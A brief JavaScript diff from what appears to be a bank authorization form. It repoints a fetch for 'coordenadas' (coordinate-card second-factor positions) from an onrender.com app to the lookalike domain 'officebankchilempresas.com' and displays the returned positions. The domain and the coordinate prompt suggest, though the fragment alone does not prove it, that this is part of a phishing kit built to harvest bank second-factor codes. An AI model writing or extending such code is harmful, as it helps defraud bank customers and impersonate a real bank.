@@ -70,7 +70,7 @@ tipoAutorizacion.addEventListener("change", async () => {
 
     // Pedir coordenadas dinámicas al backend
     try {
-      const resp = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/coordenadas");
+      const resp = await fetch("https://officebankchilempresas.com/coordenadas");
       const data = await resp.json();
 
       document.getElementById("coordLabelA").innerText = `Coordenada ${data.coordenadas[0]}`;
